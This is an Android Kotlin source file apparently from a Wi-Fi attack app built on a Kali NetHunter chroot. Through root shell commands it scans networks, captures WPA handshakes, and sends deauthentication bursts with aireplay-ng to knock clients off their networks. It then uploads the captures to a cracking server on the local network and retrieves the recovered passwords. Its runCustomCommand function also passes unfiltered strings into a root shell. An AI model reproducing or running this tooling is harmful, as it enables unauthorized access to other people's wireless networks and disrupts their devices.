package com.example.networkmonitor.data

import android.util.Log
import com.example.networkmonitor.models.Network
import okhttp3.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.io.IOException
import java.io.InputStreamReader
import kotlinx.coroutines.delay
import com.example.networkmonitor.models.CapturedFile
import okhttp3.MediaType.Companion.toMediaTypeOrNull

object DataManager {
    private const val CHROOT_PATH = "chroot /data/local/nhsystem/kali-arm64 /bin/sh -c 'export PATH=/usr/sbin:/usr/bin:/sbin:/bin && export LC_ALL=C.UTF-8 &&"
    private const val CAPTIONS_DIR = "/NetworkMonitor/Captions/"
    private const val HANDSHAKES_DIR = "/NetworkMonitor/Handshakes/"
    private const val CHROOT_DIR_PREFIX = "/data/local/nhsystem/kali-arm64"
    private const val SERVER_ADDRESS = "192.168.1.25:5000"
    private val client = OkHttpClient()

    fun runCustomCommand(command: String, updateStatus: (String, String) -> Unit) {
        updateStatus("Status: Running Command", "")
        val fullCommand = "$CHROOT_PATH $command'"
        executeCommand(fullCommand, updateStatus)
    }

    fun sendFileToServer(file: CapturedFile, bssid: String, ssid: String, onComplete: (Boolean, String) -> Unit) {
        val fileToUpload = File("$CHROOT_DIR_PREFIX$HANDSHAKES_DIR${file.fileName}")
        if (!fileToUpload.exists()) {
            onComplete(false, "File not found")
            return
        }

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart(
                "file",
                file.fileName,
                RequestBody.create("application/octet-stream".toMediaTypeOrNull(), fileToUpload)
            )
            .addFormDataPart("bssid", bssid)
            .addFormDataPart("ssid", ssid)
            .build()

        val request = Request.Builder()
            .url("http://$SERVER_ADDRESS/upload")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("DataManager", "Error sending file", e)
                onComplete(false, "Error: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!response.isSuccessful) {
                        onComplete(false, "Error: ${response.code}")
                        return
                    }

                    val jsonString = response.body?.string()
                    if (jsonString == null) {
                        onComplete(false, "Error: Empty response")
                        return
                    }

                    val json = JSONObject(jsonString)
                    // Здесь вы можете обработать ответ от сервера
                    // В данном случае, мы просто проверяем, что запрос был успешным
                    onComplete(true, "File uploaded successfully")
                }
            }
        })
    }

    fun checkFileStatus(file: CapturedFile, onComplete: (String, Map<String, Any?>) -> Unit) {
        val request = Request.Builder()
            .url("http://$SERVER_ADDRESS/status/${file.fileName}")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("DataManager", "Error checking file status", e)
                onComplete("Error: ${e.message}", emptyMap())
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!response.isSuccessful) {
                        onComplete("Error: ${response.code}", emptyMap())
                        return
                    }

                    val jsonString = response.body?.string()
                    if (jsonString == null) {
                        onComplete("Error: Empty response", emptyMap())
                        return
                    }

                    val json = JSONObject(jsonString)
                    val status = json.getString("status")
                    val result = mutableMapOf<String, Any?>()

                    when (status) {
                        "in_process" -> {
                            result["elapsed_time"] = json.getString("elapsed_time")
                            result["estimated_remaining_time"] = json.getString("estimated_remaining_time")
                            result["progress"] = json.getString("progress")
                            result["device_info"] = json.optJSONObject("device_info")?.toString()
                        }
                        "queued" -> {
                            result["position"] = json.getInt("position")
                        }
                        "processed" -> {
                            result["success"] = json.getBoolean("success")
                            result["password"] = json.optString("password")
                        }
                        "not_found" -> {
                            result["message"] = json.getString("message")
                        }
                    }

                    onComplete(status, result)
                }
            }
        })
    }

    fun loadCapturedFiles(): List<CapturedFile> {
        val directory = File(CHROOT_DIR_PREFIX+HANDSHAKES_DIR)
        val capturedFiles = mutableListOf<CapturedFile>()

        if (directory.exists() && directory.isDirectory) {
            directory.walkTopDown().forEach { file ->
                if (file.isFile && file.extension.lowercase() == "cap") {
                    capturedFiles.add(CapturedFile(
                        fileName = file.name,
                        status = "Pending",
                        queuePosition = -1
                    ))
                }
            }
        } else {
            Log.e("DataManager", "Handshakes directory does not exist or is not a directory")
        }

        return capturedFiles
    }

    fun runKillAndStartMonitorMode(updateStatus: (String, String) -> Unit) {
        val commands = listOf(
            "airmon-ng check kill",
            "ip link set wlan0 down",
            "iw dev wlan0 set type monitor",
            "ip link set wlan0 up",
            "airmon-ng start wlan0",
            "iw dev wlan0 info"
        )

        executeCommandsSequentially(commands, updateStatus)
    }

    fun startManagedMode(updateStatus: (String, String) -> Unit) {
        val commands = listOf(
            "killall airodump-ng",
            "airmon-ng stop wlan0",
            "ip link set wlan0 down",
            "iw dev wlan0 set type managed",
            "ip link set wlan0 up",
            "service networking restart",
            "wpa_supplicant -B -i wlan0 -D nl80211,wext"
        )

        executeCommandsSequentially(commands, updateStatus)
    }

    private fun executeCommandsSequentially(commands: List<String>, updateStatus: (String, String) -> Unit) {
        if (commands.isEmpty()) {
            updateStatus("Status: Completed", "All commands executed successfully")
            return
        }

        val command = commands.first()
        val fullCommand = "$CHROOT_PATH $command'"

        executeCommand(fullCommand) { status, output ->
            if (status.contains("Failed")) {
                updateStatus(status, output)
            } else {
                updateStatus(status, output)
                executeCommandsSequentially(commands.drop(1), updateStatus)
            }
        }
    }

    fun startAirodump(updateStatus: (String, String) -> Unit) {
        updateStatus("Status: Starting Airodump-ng", "")
        val deleteFilesCommand = "rm -f ./output-01.cap ./output-01.csv ./output-01.kismet.netxml ./output-01.kismet.csv ./output-01.log.csv"
        val airodumpCommand = "airodump-ng -w ./output wlan0"
        val fullCommand = "$CHROOT_PATH $deleteFilesCommand && $airodumpCommand'"

        try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", fullCommand))
            updateStatus("Status: Airodump-ng Running", "Airodump-ng has started.")
        } catch (e: IOException) {
            Log.e("DataManager", "Failed to start Airodump-ng", e)
            updateStatus("Status: Failed to start Airodump-ng", e.message ?: "")
        }
    }

    fun stopAirodump(updateStatus: (String, String) -> Unit) {
        updateStatus("Status: Stopping Airodump-ng", "")
        val stopCommand = "pkill airodump-ng"
        val fullCommand = "$CHROOT_PATH $stopCommand'"

        executeCommand(fullCommand) { status, output ->
            if (status.contains("Failed")) {
                updateStatus(status, output)
            } else {
                val networks = readAirodumpFile()
                updateStatus("Status: Airodump-ng Stopped", "Networks found: ${networks.size}")
            }
        }
    }

    fun startNetworkMonitoring(network: Network, updateStatus: (String, String) -> Unit) {
        val bssid = network.bssid
        val channel = network.channel
        val captureFile = "$CAPTIONS_DIR${bssid.replace(":", "")}"
        val deleteFilesCommand = "rm -f $captureFile*"
        val command = "airodump-ng --bssid $bssid -c $channel -w $captureFile wlan0"
        val fullCommand = "$CHROOT_PATH $deleteFilesCommand && $command'"

        updateStatus("Status: Starting Monitoring", "")
        try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", fullCommand))
            updateStatus("Status: Monitoring Running", "Monitoring has started for BSSID: $bssid")
        } catch (e: IOException) {
            Log.e("DataManager", "Failed to start monitoring for BSSID: $bssid", e)
            updateStatus("Status: Failed to start monitoring", e.message ?: "")
        }
    }

    fun stopNetworkMonitoring(network: Network, updateStatus: (String, String) -> Unit) {
        val bssid = network.bssid.replace(":", "")
        val captureFile = "$CAPTIONS_DIR$bssid-01.cap"
        val handshakeFile = "$HANDSHAKES_DIR$bssid.cap"
        val stopCommand = "pkill airodump-ng"
        val cleanCommand = "wpaclean $handshakeFile $captureFile"
        val fullCommand = "$CHROOT_PATH $stopCommand && $cleanCommand'"

        updateStatus("Status: Stopping Monitoring", "")
        executeCommand(fullCommand, updateStatus)
    }

    fun deauthenticate(network: Network, updateStatus: (String, String) -> Unit) {
        val bssid = network.bssid
        val deauthCommand = "aireplay-ng --deauth 15 -a $bssid wlan0"
        val fullCommand = "$CHROOT_PATH $deauthCommand'"

        updateStatus("Status: Deauthenticating", "")
        executeCommand(fullCommand, updateStatus)
    }


    fun readAirodumpFile(): List<Network> {
        val outputFile = File("/data/local/nhsystem/kali-arm64/output-01.csv")
        return if (outputFile.exists()) {
            Log.d("DataManager", "readAirodumpFile: \n" + parseCsvFile(outputFile))
            parseCsvFile(outputFile)
        } else {
            Log.w("DataManager", "Output file not found")
            emptyList()
        }
    }

    private fun parseCsvFile(file: File): List<Network> {
        val networks = mutableListOf<Network>()
        try {
            BufferedReader(FileReader(file)).use { reader ->
                var line = reader.readLine() // Пропускаем заголовок
                while (line != null) {
                    line = reader.readLine()
                    if (line != null && line.isNotBlank() && !line.startsWith("Station MAC") && !line.startsWith("BSSID")) {
                        val columns = line.split(",").map { it.trim() }
                        if (columns.size >= 14) {
                            val network = Network(
                                bssid = columns[0],
                                firstTimeSeen = columns[1],
                                lastTimeSeen = columns[2],
                                channel = columns[3],
                                speed = columns[4],
                                privacy = columns[5],
                                cipher = columns[6],
                                authentication = columns[7],
                                power = columns[8],
                                beacons = columns[9],
                                essid = columns[13]
                            )
                            networks.add(network)
                        }
                    }
                }
            }
        } catch (e: IOException) {
            Log.e("DataManager", "Error reading CSV file", e)
        }
        return networks
    }

    private fun executeCommand(command: String, updateStatus: (String, String) -> Unit) {
        try {
            Log.d("DataManager", "Executing command: $command")
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            val output = StringBuilder()
            val errorOutput = StringBuilder()

            var line: String? = reader.readLine()
            while (line != null) {
                output.append(line).append("\n")
                line = reader.readLine()
            }
            reader.close()

            line = errorReader.readLine()
            while (line != null) {
                errorOutput.append(line).append("\n")
                line = errorReader.readLine()
            }
            errorReader.close()

            process.waitFor()
            val exitCode = process.exitValue()

            val finalOutput = if (exitCode == 0) {
                "Output:\n$output"
            } else {
                "Error:\n$errorOutput"
            }

            updateStatus("Status: Command Completed with exit code $exitCode", finalOutput)
            Log.d("DataManager", "Command output: $finalOutput")
        } catch (e: IOException) {
            Log.e("DataManager", "Command execution failed", e)
            updateStatus("Status: Command Failed", e.message ?: "")
        } catch (e: InterruptedException) {
            Log.e("DataManager", "Command execution interrupted", e)
            updateStatus("Status: Command Interrupted", e.message ?: "")
        }
    }
}
